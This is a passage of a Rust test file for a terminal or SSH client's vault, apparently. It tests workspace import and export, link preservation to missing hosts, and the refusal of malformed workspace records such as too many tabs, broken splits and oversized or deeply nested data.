    assert!(summary.refused.is_empty(), "{:?}", summary.refused);
    assert_eq!((summary.conflicts, summary.added), (2, 1), "{summary:?}");
    let db_copy = id_of(&target.core, "host", "label", "db (imported)");
    assert_eq!(
        workspace_links(&target.core, vault, "Prod (imported)"),
        vec![Some((vault, web1)), Some((vault, db_copy)), None]
    );
    assert_eq!(
        workspace_links(&target.core, vault, "DB only"),
        vec![Some((vault, db_copy))]
    );
    assert_eq!(
        workspace_links(&target.core, vault, "Prod here"),
        vec![Some((vault, web1)), Some((vault, db)), None]
    );
    let copy = id_of(&target.core, "workspace", "name", "Prod (imported)");
    assert_eq!(
        content(&target.core).0[&("workspace".to_owned(), copy.to_string())]["import_key"],
        format!("json:{prod}")
    );

    let again = import(&target.core, &export.text, None);
    assert_eq!((again.added, again.conflicts), (0, 0), "{again:?}");
}

/// A link to a host that is neither here nor in the file stays, as every
/// reference (D63; opening the workspace leaves that pane out, D81). A
/// workspace of a hostile file goes through the rules of a save: more than
/// 32 tabs, a quick-connect target or a broken split is refused, and an
/// `import_key` of the file is checked as for other records (D84).
#[test]
fn workspace_links_to_missing_hosts_stay_and_hostile_workspaces_are_refused() {
    let source = with_workspaces();
    let web1 = id_of(&source.core, "host", "label", "web-1");
    let export = source.core.data_export(DataExportInput::default()).unwrap();
    let mut document: Value = serde_json::from_str(export.text.expose_secret()).unwrap();
    let records = document["vaults"][0]["records"].as_array_mut().unwrap();
    records.retain(|record| record["record_id"] != json!(web1.to_string()));
    let local = json!({"root": {"session": {"kind": "local"}}});
    let hostile = [
        (
            "0199f6a1-0000-7000-8000-00000000f001",
            json!({"name": "too many", "tabs": vec![local.clone(); 33]}),
        ),
        (
            "0199f6a1-0000-7000-8000-00000000f002",
            json!({"name": "quick", "tabs": [
                {"root": {"session": {"kind": "ssh", "address": "192.0.2.1"}}}
            ]}),
        ),
        (
            "0199f6a1-0000-7000-8000-00000000f003",
            json!({"name": "broken split", "tabs": [
                {"root": {"direction": "row", "sizes": [0.9, 0.9], "children": [local.clone(), local.clone()]}}
            ]}),
        ),
    ];
    for (id, data) in &hostile {
        records.push(json!({"record_id": id, "type": "workspace", "data": data}));
    }
    // One record too large for a payload is refused on its own.
    records.push(json!({
        "record_id": "0199f6a1-0000-7000-8000-00000000f005",
        "type": "workspace",
        "data": {"name": "large", "notes": "x".repeat(300 * 1024), "tabs": [local.clone()]}
    }));
    // Splits nested far beyond the limits are refused before they are read.
    let mut deep = json!({"session": {"kind": "local"}});
    for _ in 0..40 {
        deep = json!({"direction": "row", "sizes": [0.5, 0.5], "children": [deep, local["root"].clone()]});
    }
    records.push(json!({
        "record_id": "0199f6a1-0000-7000-8000-00000000f006",
        "type": "workspace",
        "data": {"name": "deep", "tabs": [{"root": deep}]}
    }));
    records.push(json!({
        "record_id": "0199f6a1-0000-7000-8000-00000000f004",
        "type": "workspace",
        "data": {"name": "long key", "import_key": "x".repeat(600), "tabs": [local]}
    }));
    let text = SecretString::from(document.to_string());

    let target = first_run();
    let vault = target.vault_id;
    let summary = import(&target.core, &text, None);
    let refused: Vec<(String, String)> = summary
        .refused
        .iter()
        .map(|refusal| (refusal.record_id.to_string(), refusal.record_type.clone()))
        .collect();
    let mut wanted: Vec<(String, String)> = hostile
        .iter()
        .map(|(id, _)| ((*id).to_owned(), "workspace".to_owned()))
        .collect();
    for id in ["f005", "f006"] {
        wanted.push((
            format!("0199f6a1-0000-7000-8000-00000000{id}"),
            "workspace".to_owned(),
        ));
    }
    assert_eq!(refused, wanted);
    let field = |at: usize| summary.refused[at].errors[0].field.clone();
    assert!(
        (0..3).all(|at| field(at) == "tabs"),
        "{:?}",
        summary.refused
    );
    assert_eq!(field(3), "record", "too large");
    assert_eq!(field(4), "tabs", "too deep");
    let db = id_of(&target.core, "host", "label", "db");
    assert_eq!(
        workspace_links(&target.core, vault, "Prod"),
        vec![Some((vault, web1)), Some((vault, db)), None],
        "the link to the missing host stays"
    );
    // The new tab page names it from the names the workspace saved (D94).
    let prod = target
        .core
        .workspace_summaries(vault)
        .unwrap()
        .into_iter()
        .find(|summary| summary.name == "Prod")
        .unwrap();
    assert_eq!(prod.missing_hosts, ["web-1"]);
    let long = id_of(&target.core, "workspace", "name", "long key");
    assert!(
        content(&target.core).0[&("workspace".to_owned(), long.to_string())]
            .get("import_key")
            .is_none(),
        "a bad import key is left out"
    );
}

/// A workspace keeps the names of its hosts when it is saved; a host deleted
/// since is listed by that name, and is no longer missing once it is back
/// (D94; UI 6, "N hosts not found").
#[test]
fn a_deleted_host_is_named_by_the_workspace() {
    let u = with_workspaces();
    let vault = u.vault_id;
    let db = id_of(&u.core, "host", "label", "db");
    let missing = |name: &str| {
        u.core
            .workspace_summaries(vault)
            .unwrap()
            .into_iter()
            .find(|summary| summary.name == name)
            .unwrap()
            .missing_hosts
    };
    assert!(missing("Prod").is_empty());
    u.core
        .record_delete(RecordsRef {
            vault_id: vault,
            record_ids: vec![db],
        })
        .unwrap();
    assert_eq!(missing("Prod"), ["db"]);
    assert_eq!(missing("DB only"), ["db"]);
    // A rename keeps the saved name of the host that is gone.
    let prod = id_of(&u.core, "workspace", "name", "Prod");
    let tabs = u
        .core
        .workspaces_list(vault)
        .unwrap()
        .into_iter()
        .find(|workspace| workspace.record.record_id == prod)
        .unwrap()
        .tabs;
    u.core
        .workspace_save(record_input(
            &u,
            Some(prod),
            json!({"name": "Prod 2", "tabs": serde_json::to_value(tabs).unwrap()}),
        ))
        .unwrap();
    assert_eq!(missing("Prod 2"), ["db"]);
    u.core
        .record_restore(RecordsRef {
            vault_id: vault,
            record_ids: vec![db],
        })
        .unwrap();
    assert!(missing("Prod 2").is_empty());
    assert!(missing("DB only").is_empty());
}
